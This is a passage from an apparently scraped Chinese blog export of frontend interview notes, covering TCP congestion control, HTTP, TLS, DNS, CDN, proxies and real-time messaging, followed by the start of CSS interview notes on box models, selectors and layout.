实现会将失序的报文段给缓存起来，并且发生重传时，只会重传一个报文段，因此 TCP 协议的可靠传输机制更像是窗口滑动协议和选择重传协议的一个混合体。 TCP 的流量控制机制TCP 提供了流量控制的服务，这个服务的主要目的是控制发送方的发送速率，保证接收方来得及接收。因为一旦发送的速率大于接收方所能接收的速率，就会造成报文段的丢失。接收方主要是通过接收窗口来告诉发送方自己所能接收的大小，发送方根据接收方的接收窗口的大小来调整发送窗口的大小，以此来达到控制发送速率的目的。 TCP 的拥塞控制机制TCP 的拥塞控制主要是根据网络中的拥塞情况来控制发送方数据的发送速率，如果网络处于拥塞的状态，发送方就减小发送的速率，这样一方面是为了避免继续增加网络中的拥塞程度，另一方面也是为了避免网络拥塞可能造成的报文段丢失。 TCP 的拥塞控制主要使用了四个机制，分别是慢启动、拥塞避免、快速重传和快速恢复。 慢启动的基本思想是，因为在发送方刚开始发送数据的时候，并不知道网络中的拥塞程度，所以先以较低的速率发送，进行试探，每次收到一个确认报文，就将发动窗口的长度加一，这样每个 RTT 时间后，发送窗口的长度就会加倍。当发送窗口的大小达到一个阈值的时候就进入拥塞避免算法。 拥塞避免算法是为了避免可能发生的拥塞，将发送窗口的大小由每过一个 RTT 增长一倍，变为每过一个 RTT ，长度只加一。这样将窗口的增长速率由指数增长，变为加法线性增长。 快速重传指的是，当发送方收到三个冗余的确认应答时，因为 TCP 使用的是累计确认的机制，所以很有可能是发生了报文段的丢失，因此采用立即重传的机制，在定时器结束前发送所有已发送但还未接收到确认应答的报文段。 快速恢复是对快速重传的后续处理，因为网络中可能已经出现了拥塞情况，所以会将慢启动的阀值减小为原来的一半，然后将拥塞窗口的值置为减半后的阀值，然后开始执行拥塞避免算法，使得拥塞窗口缓慢地加性增大。简单来理解就是，乘性减，加性增。 TCP 认为网络拥塞的主要依据是报文段的重传次数，它会根据网络中的拥塞程度，通过调整慢启动的阀值，然后交替使用上面四种机制来达到拥塞控制的目的。 详细资料可以参考：《TCP 的拥塞控制机制》《网络基本功：TCP 拥塞控制机制》 网络层网络层协议主要实现了不同主机间的逻辑通信功能。网络层协议一共包含两个主要的组件，一个 IP 网际协议，一个是路由选择协议。 IP 网际协议规定了网络层的编址和转发方式，比如说我们接入网络的主机都会被分配一个 IP 地址，常用的比如 IPV4 使用32位来分配地址，还有 IPv6 使用128位来分配地址。 路由选择协议决定了数据报从源到目的地所流经的路径，常见的比如距离向量路由选择算法等。 数据链路层数据链路层提供的服务是如何将数据报通过单一通信链路从一个结点移动到相邻节点。每一台主机都有一个唯一的 MAC 地址，这是由网络适配器决定的，在全世界都是独一无二的。 物理层物理层提供的服务是尽可能的屏蔽掉组成网络的物理设备和传输介质间的差异，使数据链路层不需要考虑网络的具体传输介质是什么。 详细资料可以参考：《搞定计算机网络面试，看这篇就够了（补充版）》《互联网协议入门（一）》《互联网协议入门（二）》 常考面试题1. Post 和 Get 的区别？ 123456789101112Post 和 Get 是 HTTP 请求的两种方法。（1）从应用场景上来说，GET 请求是一个幂等的请求，一般 Get 请求用于对服务器资源不会产生影响的场景，比如说请求一个网 页。而 Post 不是一个幂等的请求，一般用于对服务器资源会产生影响的情景。比如注册用户这一类的操作。 （2）因为不同的应用场景，所以浏览器一般会对 Get 请求缓存，但很少对 Post 请求缓存。（3）从发送的报文格式来说，Get 请求的报文中实体部分为空，Post 请求的报文中实体部分一般为向服务器发送的数据。（4）但是 Get 请求也可以将请求的参数放入 url 中向服务器发送，这样的做法相对于 Post 请求来说，一个方面是不太安全， 因为请求的 url 会被保留在历史记录中。并且浏览器由于对 url 有一个长度上的限制，所以会影响 get 请求发送数据时 的长度。这个限制是浏览器规定的，并不是 RFC 规定的。还有就是 post 的参数传递支持更多的数据类型。 2. TLS/SSL 中什么一定要用三个随机数，来生成”会话密钥”？ 123客户端和服务器都需要生成随机数，以此来保证每次生成的秘钥都不相同。使用三个随机数，是因为 SSL 的协议默认不信任每个主机都能产生完全随机的数，如果只使用一个伪随机的数来生成秘钥，就很容易被破解。通过使用三个随机数的方式，增加了自由度，一个伪随机可能被破解，但是三个伪随机就很接近于随机了，因此可以使用这种方法来保持生成秘钥的随机性和安全性。 3. SSL 连接断开后如何恢复？ 12345678910一共有两种方法来恢复断开的 SSL 连接，一种是使用 session ID，一种是 session ticket。使用 session ID 的方式，每一次的会话都有一个编号，当对话中断后，下一次重新连接时，只要客户端给出这个编号，服务器如果有这个编号的记录，那么双方就可以继续使用以前的秘钥，而不用重新生成一把。目前所有的浏览器都支持这一种方法。但是这种方法有一个缺点是，session ID 只能够存在一台服务器上，如果我们的请求通过负载平衡被转移到了其他的服务器上，那么就无法恢复对话。另一种方式是 session ticket 的方式，session ticket 是服务器在上一次对话中发送给客户的，这个 ticket 是加密的，只有服务器能够解密，里面包含了本次会话的信息，比如对话秘钥和加密方法等。这样不管我们的请求是否转移到其他的服务器上，当服务器将 ticket 解密以后，就能够获取上次对话的信息，就不用重新生成对话秘钥了。 4. RSA 算法的安全性保障？ 12对极大整数做因数分解的难度决定了 RSA 算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。现在1024位的 RSA 密钥基本安全，2048位的密钥极其安全。 5. DNS 为什么使用 UDP 协议作为传输层协议？ 123456789101112DNS 使用 UDP 协议作为传输层协议的主要原因是为了避免使用 TCP 协议时造成的连接时延。因为为了得到一个域名的 IP 地址，往往会向多个域名服务器查询，如果使用 TCP 协议，那么每次请求都会存在连接时延，这样使 DNS 服务变得很慢，因为大多数的地址查询请求，都是浏览器请求页面时发出的，这样会造成网页的等待时间过长。使用 UDP 协议作为 DNS 协议会有一个问题，由于历史原因，物理链路的最小MTU &#x3D; 576，所以为了限制报文长度不超过576，UDP 的报文段的长度被限制在 512 个字节以内，这样一旦 DNS 的查询或者应答报文，超过了 512 字节，那么基于 UDP 的DNS 协议就会被截断为 512 字节，那么有可能用户得到的 DNS 应答就是不完整的。这里 DNS 报文的长度一旦超过限制，并不会像 TCP 协议那样被拆分成多个报文段传输，因为 UDP 协议不会维护连接状态，所以我们没有办法确定那几个报文段属于同一个数据，UDP 只会将多余的数据给截取掉。为了解决这个问题，我们可以使用 TCP 协议去请求报文。DNS 还存在的一个问题是安全问题，就是我们没有办法确定我们得到的应答，一定是一个安全的应答，因为应答可以被他人伪造，所以现在有了 DNS over HTTPS 来解决这个问题。 详细资料可以参考： 《为什么 DNS 使用 UDP 而不是 TCP？》 6. 当你在浏览器中输入 Google.com 并且按下回车之后发生了什么？ 123456789101112131415161718192021222324252627282930313233343536373839404142（1）首先会对 URL 进行解析，分析所需要使用的传输协议和请求的资源的路径。如果输入的 URL 中的协议或者主机名不合法， 将会把地址栏中输入的内容传递给搜索引擎。如果没有问题，浏览器会检查 URL 中是否出现了非法字符，如果存在非法字 符，则对非法字符进行转义后再进行下一过程。 （2）浏览器会判断所请求的资源是否在缓存里，如果请求的资源在缓存里并且没有失效，那么就直接使用，否则向服务器发起新 的请求。（3）下一步我们首先需要获取的是输入的 URL 中的域名的 IP 地址，首先会判断本地是否有该域名的 IP 地址的缓存，如果 有则使用，如果没有则向本地 DNS 服务器发起请求。本地 DNS 服务器也会先检查是否存在缓存，如果没有就会先向根域 名服务器发起请求，获得负责的顶级域名服务器的地址后，再向顶级域名服务器请求，然后获得负责的权威域名服务器的地 址后，再向权威域名服务器发起请求，最终获得域名的 IP 地址后，本地 DNS 服务器再将这个 IP 地址返回给请求的用 户。用户向本地 DNS 服务器发起请求属于递归请求，本地 DNS 服务器向各级域名服务器发起请求属于迭代请求。（4）当浏览器得到 IP 地址后，数据传输还需要知道目的主机 MAC 地址，因为应用层下发数据给传输层，TCP 协议会指定源 端口号和目的端口号，然后下发给网络层。网络层会将本机地址作为源地址，获取的 IP 地址作为目的地址。然后将下发给 数据链路层，数据链路层的发送需要加入通信双方的 MAC 地址，我们本机的 MAC 地址作为源 MAC 地址，目的 MAC 地 址需要分情况处理，通过将 IP 地址与我们本机的子网掩码相与，我们可以判断我们是否与请求主机在同一个子网里，如果 在同一个子网里，我们可以使用 APR 协议获取到目的主机的 MAC 地址，如果我们不在一个子网里，那么我们的请求应该 转发给我们的网关，由它代为转发，此时同样可以通过 ARP 协议来获取网关的 MAC 地址，此时目的主机的 MAC 地址应 该为网关的地址。（5）下面是 TCP 建立连接的三次握手的过程，首先客户端向服务器发送一个 SYN 连接请求报文段和一个随机序号，服务端接 收到请求后向服务器端发送一个 SYN ACK报文段，确认连接请求，并且也向客户端发送一个随机序号。客户端接收服务器的 确认应答后，进入连接建立的状态，同时向服务器也发送一个 ACK 确认报文段，服务器端接收到确认后，也进入连接建立 状态，此时双方的连接就建立起来了。（6）如果使用的是 HTTPS 协议，在通信前还存在 TLS 的一个四次握手的过程。首先由客户端向服务器端发送使用的协议的版 本号、一个随机数和可以使用的加密方法。服务器端收到后，确认加密的方法，也向客户端发送一个随机数和自己的数字证 书。客户端收到后，首先检查数字证书是否有效，如果有效，则再生成一个随机数，并使用证书中的公钥对随机数加密，然后 发送给服务器端，并且还会提供一个前面所有内容的 hash 值供服务器端检验。服务器端接收后，使用自己的私钥对数据解 密，同时向客户端发送一个前面所有内容的 hash 值供客户端检验。这个时候双方都有了三个随机数，按照之前所约定的加 密方法，使用这三个随机数生成一把秘钥，以后双方通信前，就使用这个秘钥对数据进行加密后再传输。（7）当页面请求发送到服务器端后，服务器端会返回一个 html 文件作为响应，浏览器接收到响应后，开始对 html 文件进行 解析，开始页面的渲染过程。（8）浏览器首先会根据 html 文件构建 DOM 树，根据解析到的 css 文件构建 CSSOM 树，如果遇到 script 标签，则判端 是否含有 defer 或者 async 属性，要不然 script 的加载和执行会造成页面的渲染的阻塞。当 DOM 树和 CSSOM 树建 立好后，根据它们来构建渲染树。渲染树构建好后，会根据渲染树来进行布局。布局完成后，最后使用浏览器的 UI 接口对页 面进行绘制。这个时候整个页面就显示出来了。（9）最后一步是 TCP 断开连接的四次挥手过程。 详细资料可以参考： 《当你在浏览器中输入 Google.com 并且按下回车之后发生了什么？》 7. 谈谈 CDN 服务？ 123CDN 是一个内容分发网络，通过对源网站资源的缓存，利用本身多台位于不同地域、不同运营商的服务器，向用户提供资就近访问的功能。也就是说，用户的请求并不是直接发送给源网站，而是发送给 CDN 服务器，由 CND 服务器将请求定位到最近的含有该资源的服务器上去请求。这样有利于提高网站的访问速度，同时通过这种方式也减轻了源服务器的访问压力。 详细资料可以参考： 《CDN 是什么？使用 CDN 有什么优势？》 8. 什么是正向代理和反向代理？ 123456我们常说的代理也就是指正向代理，正向代理的过程，它隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求。反向代理隐藏了真实的服务端，当我们请求一个网站的时候，背后可能有成千上万台服务器为我们服务，但具体是哪一台，我们不知道，也不需要知道，我们只需要知道反向代理服务器是谁就好了，反向代理服务器会帮我们把请求转发到真实的服务器那里去。反向代理器一般用来实现负载平衡。 详细资料可以参考： 《正向代理与反向代理有什么区别》 《webpack 配置 proxy 反向代理的原理是什么？》 9. 负载平衡的两种实现方式？ 12345678一种是使用反向代理的方式，用户的请求都发送到反向代理服务上，然后由反向代理服务器来转发请求到真实的服务器上，以此来实现集群的负载平衡。另一种是 DNS 的方式，DNS 可以用于在冗余的服务器上实现负载平衡。因为现在一般的大型网站使用多台服务器提供服务，因此一个域名可能会对应多个服务器地址。当用户向网站域名请求的时候，DNS 服务器返回这个域名所对应的服务器 IP 地址的集合，但在每个回答中，会循环这些 IP 地址的顺序，用户一般会选择排在前面的地址发送请求。以此将用户的请求均衡的分配到各个不同的服务器上，这样来实现负载均衡。这种方式有一个缺点就是，由于 DNS 服务器中存在缓存，所以有可能一个服务器出现故障后，域名解析仍然返回的是那个 IP 地址，就会造成访问的问题。 详细资料可以参考： 《负载均衡的原理》 10. http 请求方法 options 方法有什么用？ 123OPTIONS 请求与 HEAD 类似，一般也是用于客户端查看服务器的性能。这个方法会请求服务器返回该资源所支持的所有 HTTP 请求方法，该方法会用&#39;*&#39;来代替资源名称，向服务器发送 OPTIONS 请求，可以测试服务器功能是否正常。JS 的 XMLHttpRequest对象进行 CORS 跨域资源共享时，对于复杂请求，就是使用 OPTIONS 方法发送嗅探请求，以判断是否有对指定资源的访问权限。 相关资料可以参考： 《HTTP 请求方法》 11. http1.1 和 http1.0 之间有哪些区别？ 12345678910111213141516171819http1.1 相对于 http1.0 有这样几个区别：（1）连接方面的区别，http1.1 默认使用持久连接，而 http1.0 默认使用非持久连接。http1.1 通过使用持久连接来使多个 http 请求复用同一个 TCP 连接，以此来避免使用非持久连接时每次需要建立连接的时延。（2）资源请求方面的区别，在 http1.0 中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个 对象送过来了，并且不支持断点续传功能，http1.1 则在请求头引入了 range 头域，它允许只请求资源的某个部分，即返回码 是 206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。（3）缓存方面的区别，在 http1.0 中主要使用 header 里的 If-Modified-Since,Expires 来做为缓存判断的标准，http1.1 则引入了更多的缓存控制策略例如 Etag、If-Unmodified-Since、If-Match、If-None-Match 等更多可供选择的缓存头来 控制缓存策略。（4）http1.1 中还新增了 host 字段，用来指定服务器的域名。http1.0 中认为每台服务器都绑定一个唯一的 IP 地址，因此， 请求消息中的 URL 并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机 ，并且它们共享一个IP地址。因此有了 host 字段，就可以将请求发往同一台服务器上的不同网站。（5）http1.1 相对于 http1.0 还新增了很多方法，如 PUT、HEAD、OPTIONS 等。 详细资料可以参考： 《HTTP1.0、HTTP1.1 和 HTTP2.0 的区别》 《HTTP 协议入门》 《网络—一篇文章详解请求头 Host 的概念》 12. 网站域名加 www 与不加 www 的区别？ 详细资料可以参考： 《为什么域名前要加 www 前缀 www 是什么意思？》 《为什么越来越多的网站域名不加「www」前缀？》 《域名有 www 与没有 www 有什么区别？》 13. 即时通讯的实现，短轮询、长轮询、SSE 和 WebSocket 间的区别？ 12345678910111213141516171819202122短轮询和长轮询的目的都是用于实现客户端和服务器端的一个即时通讯。短轮询的基本思路就是浏览器每隔一段时间向浏览器发送 http 请求，服务器端在收到请求后，不论是否有数据更新，都直接进行响应。这种方式实现的即时通信，本质上还是浏览器发送请求，服务器接受请求的一个过程，通过让客户端不断的进行请求，使得客户端能够模拟实时地收到服务器端的数据的变化。这种方式的优点是比较简单，易于理解。缺点是这种方式由于需要不断的建立 http 连接，严重浪费了服务器端和客户端的资源。当用户增加时，服务器端的压力就会变大，这是很不合理的。长轮询的基本思路是，首先由客户端向服务器发起请求，当服务器收到客户端发来的请求后，服务器端不会直接进行响应，而是先将这个请求挂起，然后判断服务器端数据是否有更新。如果有更新，则进行响应，如果一直没有数据，则到达一定的时间限制才返回。客户端 JavaScript 响应处理函数会在处理完服务器返回的信息后，再次发出请求，重新建立连接。长轮询和短轮询比起来，它的优点是明显减少了很多不必要的 http 请求次数，相比之下节约了资源。长轮询的缺点在于，连接挂起也会导致资源的浪费。SSE 的基本思想是，服务器使用流信息向服务器推送信息。严格地说，http 协议无法做到服务器主动推送信息。但是，有一种变通方法，就是服务器向客户端声明，接下来要发送的是流信息。也就是说，发送的不是一次性的数据包，而是一个数据流，会连续不断地发送过来。这时，客户端不会关闭连接，会一直等着服务器发过来的新的数据流，视频播放就是这样的例子。SSE 就是利用这种机制，使用流信息向浏览器推送信息。它基于 http 协议，目前除了 IE&#x2F;Edge，其他浏览器都支持。它相对于前面两种方式来说，不需要建立过多的 http 请求，相比之下节约了资源。上面三种方式本质上都是基于 http 协议的，我们还可以使用 WebSocket 协议来实现。WebSocket 是 Html5 定义的一个新协议，与传统的 http 协议不同，该协议允许由服务器主动的向客户端推送信息。使用 WebSocket 协议的缺点是在服务器端的配置比较复杂。WebSocket 是一个全双工的协议，也就是通信双方是平等的，可以相互发送消息，而 SSE 的方式是单向通信的，只能由服务器端向客户端推送信息，如果客户端需要发送信息就是属于下一个 http 请求了。 详细资料可以参考： 《轮询、长轮询、长连接、websocket》 《Server-Sent Events 教程》 《WebSocket 教程》 14. 怎么实现多个网站之间共享登录状态 1234567在多个网站之间共享登录状态指的就是单点登录。多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统。我认为单点登录可以这样来实现，首先将用户信息的验证中心独立出来，作为一个单独的认证中心，该认证中心的作用是判断客户端发送的账号密码的正确性，然后向客户端返回对应的用户信息，并且返回一个由服务器端秘钥加密的登录信息的 token 给客户端，该token 具有一定的有效时限。当一个应用系统跳转到另一个应用系统时，通过 url 参数的方式来传递 token，然后转移到的应用站点发送给认证中心，认证中心对 token 进行解密后验证，如果用户信息没有失效，则向客户端返回对应的用户信息，如果失效了则将页面重定向会单点登录页面。 详细资料可以参考： 《HTTP 是个无状态协议，怎么保持登录状态？》","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"面经笔经","slug":"技术/前端/面经笔经","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/%E9%9D%A2%E7%BB%8F%E7%AC%94%E7%BB%8F/"}],"tags":[]},{"title":"css复习汇总","slug":"css复习汇总","date":"2020-03-15T16:00:00.000Z","updated":"2024-05-25T04:21:30.308Z","comments":true,"path":"2020/03/16/css复习汇总/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/16/css%E5%A4%8D%E4%B9%A0%E6%B1%87%E6%80%BB/","excerpt":"CSS 面试知识点总结本文搬运自CavsZhouyou的github 本部分主要是笔者在复习 CSS 相关知识和一些相关面试题时所做的笔记，如果出现错误，希望大家指出！","text":"CSS 面试知识点总结本文搬运自CavsZhouyou的github 本部分主要是笔者在复习 CSS 相关知识和一些相关面试题时所做的笔记，如果出现错误，希望大家指出！ 1.介绍一下标准的 CSS 的盒子模型？低版本 IE 的盒子模型有什么不同的？ （1）有两种盒子模型：IE盒模型（border-box）、W3C标准盒模型（content-box）（2）盒模型：分为内容（content）、填充（padding）、边界（margin）、边框（border）四个部分 IE盒模型和W3C标准盒模型的区别： （1）W3C标准盒模型：属性width，height只包含内容content，不包含border和padding（2）IE盒模型：属性width，height包含content、border和padding，指的是content+padding+border。 在ie8+浏览器中使用哪个盒模型可以由box-sizing（CSS新增的属性）控制，默认值为content-box，即标准盒模型；如果将box-sizing设为border-box则用的是IE盒模型。 如果在ie6，7，8中DOCTYPE缺失会将盒子模型解释为IE盒子模型。若在页面中声明了DOCTYPE类型，所有的浏览器都会把盒模型解释为W3C盒模型。 2.CSS 选择符有哪些？ （1）id选择器（#myid）（2）类选择器（.myclassname）（3）标签选择器（div,h1,p）（4）后代选择器（h1p）（5）相邻后代选择器（子）选择器（ul&gt;li）（6）兄弟选择器（li~a）（7）相邻兄弟选择器（li+a）（8）属性选择器（a[rel=”external”]）（9）伪类选择器（a:hover,li:nth-child）（10）伪元素选择器（::before、::after）（11）通配符选择器（*） 3.::before 和:after 中双冒号和单冒号有什么区别？ 在css3中使用单冒号来表示伪类，用双冒号来表示伪元素。但是为了兼容已有的伪元素的写法，在一些浏览器中也可以使用单冒号来表示伪元素。 伪类一般匹配的是元素的一些特殊状态，如hover、link等，而伪元素一般匹配的特殊的位置，比如after、before等。 4.伪类与伪元素的区别 伪类用于当已有的元素处于某个状态时，为其添加对应的样式，这个状态是根据用户行为而动态变化的。比如说，当用户悬停在指定的元素时，我们可以通过:hover来描述这个元素的状态。 伪元素用于创建一些不在文档树中的元素，并为其添加样式。它们允许我们为元素的某些部分设置样式。比如说，我们可以通过::before来在一个元素前增加一些文本，并为这些文本添加样式。虽然用户可以看到这些文本，但是这些文本实际上不在文档树中。 5.CSS 中哪些属性可以继承？ （1）字体系列属性font、font-family、font-weight、font-size、font-style、font-variant、font-stretch、font-size-adjust（2）文本系列属性text-indent、text-align、text-shadow、line-height、word-spacing、letter-spacing、text-transform、direction、color（3）表格布局属性caption-sideborder-collapseempty-cells（4）列表属性list-style-type、list-style-image、list-style-position、list-style（5）光标属性cursor（6）元素可见性visibility（7）还有一些不常用的；speak，page，设置嵌套引用的引号类型quotes等属性 回答简版 一般具有继承性的属性有，字体相关的属性，font-size和font-weight等。文本相关的属性，color和text-align等。表格的一些布局属性、列表属性如list-style等。还有光标属性cursor[ˈkɜːsə(r)]、元素可见性visibility。 当一个属性不是继承属性的时候，我们也可以通过将它的值设置为inherit来使它从父元素那获取同名的属性值来继承。 6.CSS 优先级算法如何计算？使用特殊性进行计算 第一个等级是行内样式，为1000，第二个等级是id选择器，为100，第三个等级是类选择器、伪类选择器和属性选择器，为10，第四个等级是元素选择器和伪元素选择器，为1。规则中每出现一个选择器，就将它的特殊性进行叠加，这个叠加只限于对应的等级的叠加，不会产生进位 如果两个规则的特殊性值相等的时候，那么就会根据它们引入的顺序，后出现的规则的优先级最高。 7.关于四种伪类 LVHA 顺序的解释? a标签有四种状态：链接访问前、链接访问后、鼠标滑过、激活，分别对应四种伪类:link、:visited、:hover、:active； 当链接未访问过时： （1）当鼠标滑过a链接时，满足:link和:hover两种状态，要改变a标签的颜色，就必须将:hover伪类在:link伪类后面声明；（2）当鼠标点击激活a链接时，同时满足:link、:hover、:active三种状态，要显示a标签激活时的样式（:active），必须将:active声明放到:link和:hover之后。因此得出LVHA这个顺序。 当链接访问过时 情况基本同上，只不过需要将:link换成:visited。 这个顺序能不能变？可以，但也只有:link和:visited可以交换位置，因为一个链接要么访问过要么没访问过，不可能同时满足，也就不存在覆盖的问题。 8.CSS3 新增伪类有那些？ （1）elem:nth-child(n)选中父元素下的第n个子元素，并且这个子元素的标签名为elem，n可以接受具体的数值，也可以接受函数。 （2）elem:nth-last-child(n)作用同上，不过是从后开始查找。 （3）elem:last-child选中最后一个子元素。 （4）elem:only-child如果elem是父元素下唯一的子元素，则选中之。 （5）elem:nth-of-type(n)选中父元素下第n个elem类型元素，n可以接受具体的数值，也可以接受函数。 （6）elem:first-of-type选中父元素下第一个elem类型元素。 （7）elem:last-of-type选中父元素下最后一个elem类型元素。 （8）elem:only-of-type如果父元素下的子元素只有一个elem类型元素，则选中该元素。 （9）elem:empty选中不包含子元素和内容的elem类型元素。 （10）elem:target选择当前活动的elem元素。 （11）:not(elem)选择非elem元素的每个元素。 （12）:enabled 控制表单控件的禁用状态。 （13）:disabled 控制表单控件的禁用状态。 (14):checked单选框或复选框被选中。 9.如何居中 div？回答总结一般常见的几种居中的方法有：对于宽高固定的元素 （1）我们可以利用margin:0auto来实现元素的水平居中。（2）利用绝对定位，设置四个方向的值都为0，并将margin设置为auto，由于宽高固定，因此对应方向实现平分，可以实现水平和垂直方向上的居中。（3）利用绝对定位，先将元素的左上角通过top:50%和left:50%定位到页面的中心，然后再通过margin负值来调整元素的中心点到页面的中心。（4）利用绝对定位，先将元素的左上角通过top:50%和left:50%定位到页面的中心，然后再通过translate来调整元素的中心点到页面的中心。（5）使用flex布局，通过align-items:center和justify-content:center设置容器的垂直和水平方向上为居中对齐，然后它的子元素也可以实现垂直和水平的居中。 对于宽高不定的元素，上面的后面两种方法，可以实现元素的垂直和水平的居中。 10.display 有哪些值？说明他们的作用。 block 块类型。默认宽度为父元素宽度，可设置宽高，换行显示。none 元素不显示，并从文档流中移除。inline 行内元素类型。默认宽度为内容宽度，不可设置宽高，同行显示。inline-block默认宽度为内容宽度，可以设置宽高，同行显示。list-item 像块类型元素一样显示，并添加样式列表标记。table 此元素会作为块级表格来显示。inherit 规定应该从父元素继承display属性的值。 11.position 的值 relative 和 absolute 定位原点是？ relative定位的元素，是相对于元素本身的正常位置来进行定位的。 absolute定位的元素，是相对于它的第一个position值不为static的祖先元素的paddingbox来进行定位的,也就是说在计算定位距离的时候，padding的值也要算进去。 12.CSS3 有哪些新特性？（根据项目回答） 新增各种CSS选择器 :not(.input)：所有class不是“input”的节点圆角 （border-radius:8px）多列布局 （multi-columnlayout）阴影和反射 （Shadow\\Reflect）文字特效 （text-shadow）文字渲染 （Text-decoration）线性渐变 （gradient）旋转 （transform）缩放，定位，倾斜，动画，多背景 13.请解释一下 CSS3 的 Flexbox（弹性盒布局模型），以及适用场景？ flex布局是CSS3新增的一种布局方式，我们可以通过将一个元素的display属性值设置为flex从而使它成为一个flex容器，它的所有子元素都会成为它的项目。 一个容器默认有两条轴，一个是水平的主轴，一个是与主轴垂直的交叉轴。我们可以使用flex-direction来指定主轴的方向。我们可以使用justify-content来指定元素在主轴上的排列方式，使用align-items来指定元素在交叉轴上的排列方式。还可以使用flex-wrap来规定当一行排列不下时的换行方式。 对于容器中的项目，我们可以使用order属性来指定项目的排列顺序，还可以使用flex-grow来指定当排列空间有剩余的时候，项目的放大比例。还可以使用flex-shrink来指定当排列空间不足时，项目的缩小比例。 14.用纯 CSS 创建一个三角形的原理是什么？ 采用的是相邻边框连接处的均分原理。将元素的宽高设为0，只设置border，把任意三条边隐藏掉（颜色设为transparent），剩下的就是一个三角形。 1234567#demo &#123; width: 0; height: 0; border-width: 20px; border-style: solid; border-color: transparenttransparentredtransparent;&#125; 15.一个满屏品字布局如何设计? 上面的div宽100%，下面的两个div分别宽50%，然后用float或者inline使其不换行即可 16.CSS 多列等高如何实现？ （1）利用padding-bottom|margin-bottom正负值相抵，不会影响页面布局的特点。设置父容器设置超出隐藏（overflow:hidden），这样父容器的高度就还是它里面的列没有设定padding-bottom时的高度，当它里面的任一列高度增加了，则父容器的高度被撑到里面最高那列的高度，其他比这列矮的列会用它们的padding-bottom补偿这部分高度差。12margin: 0 10px -9999px 0;padding-bottom: 9999px; （2）利用table-cell所有单元格高度都相等的特性，来实现多列等高。 ?（3）利用flex布局中项目align-items属性默认为stretch，如果项目未设置高度或设为auto，将占满整个容器的高度的特性，来实现多列等高。 17.经常遇到的浏览器的兼容性有哪些？原因，解决方法是什么，常用 hack 的技巧？ png24位的图片在iE6浏览器上出现背景，解决方案是做成PNG8 浏览器默认的margin和padding不同。解决方案是加一个全局的*{margin:0;padding:0;}来统一,，但是全局效率很低，一般是如下这样解决：1234body,ul,li,ol,dl,dt,dd,form,input,h1,h2,h3,h4,h5,h6,p&#123;margin:0;padding:0;&#125;IE下,event对象有x,y属性,但是没有pageX,pageY属性 Firefox下,event对象有pageX,pageY属性,但是没有x,y属性 18.li 与 li 之间有看不见的空白间隔是什么原因引起的？有什么解决办法？ 浏览器会把inline元素间的空白字符（空格、换行、Tab等）渲染成一个空格。而为了美观。我们通常是一个&lt;li&gt;放在一行，这导致&lt;li&gt;换行后产生换行字符，它变成一个空格，占用了一个字符的宽度。 解决方案 （1）为&lt;li&gt;设置float:left。不足：有些容器是不能设置浮动，如左右切换的焦点图等。 （2）将所有&lt;li&gt;写在同一行。不足：代码不美观。 （3）将&lt;ul&gt;内的字符尺寸直接设为0，即font-size:0。不足：&lt;ul&gt;中的其他字符尺寸也被设为0，需要额外重新设定其他字符尺寸，且在Safari浏览器依然会出现空白间隔。 ?（4）消除&lt;ul&gt;的字符间隔letter-spacing:-8px，不足：这也设置了内的字符间隔，因此需要将内的字符间隔设为默认letter-spacing:normal。 19.为什么要初始化 CSS 样式？. 因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。 当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。 20.什么是包含块，对于包含块的理解? 包含块（containingblock）就是元素用来计算和定位的一个框。 不同的定位方式，包含块的选择也不一样 （1）根元素（很多场景下可以看成是&lt;html&gt;）被称为“初始包含块”，其尺寸等同于浏览器可视窗口的大小。 （2）对于其他元素，如果该元素的position是relative或者static，则“包含块”由其最近的块容器祖先盒的contentbox边界形成。 （3）如果元素position:fixed，则“包含块”是“初始包含块”。 （4）如果元素position:absolute，则“包含块”由最近的position不为static的祖先元素的paddingbox建立 CSS 里的 visibility 属性有个 collapse 属性值是干嘛用的 （1）对于一般的元素，它的表现跟visibility：hidden;是一样的。元素是不可见的，但此时仍占用页面空间。（2）但例外的是，如果这个元素是table相关的元素，例如table行，tablegroup，table列，tablecolumngroup，它的表现却跟display:none一样，也就是说，它们占用的空间也会释放。 不同浏览器下的表现 在谷歌浏览器里，使用collapse值和使用hidden值没有什么区别。 在火狐浏览器、Opera和IE11里，使用collapse值的效果就如它的字面意思：table的行会消失，它的下面一行会补充它的位置。 22.width:auto 和 width:100%的区别 width:100%会使元素box的宽度等于父元素的contentbox的宽度。 width:auto会使元素撑满整个父元素，margin、border、padding、content区域会自动分配水平空间。 23.绝对定位元素与非绝对定位元素的百分比计算的区别 绝对定位元素的宽高百分比是相对于临近的position不为static的祖先元素的paddingbox来计算的。 非绝对定位元素的宽高百分比则是相对于父元素的contentbox来计算的。 24.简单介绍使用图片 base64 编码的优点和缺点。使用base64的优点是： （1）减少一个图片的HTTP请求 使用base64的缺点是： （1）根据base64的编码原理，编码后的大小会比原文件大小大1/3，如果把大图片编码到html/css中，不仅会造成文件体积的增加，影响文件的加载速度，还会增加浏览器对html或css文件解析渲染的时间。 （2）使用base64无法直接缓存，要缓存只能缓存包含base64的文件，比如HTML或者CSS，这相比域直接缓存图片的效果要差很多。 （3）兼容性的问题，ie8以前的浏览器不支持。 25.’display’、’position’和’float’的相互关系？ （1）首先我们判断display属性是否为none，如果为none，则position和float属性的值不影响元素最后的表现。 （2）然后判断position的值是否为absolute或者fixed，如果是，则float属性失效，并且display的值应该被设置为table或者block，具体转换需要看初始转换值。 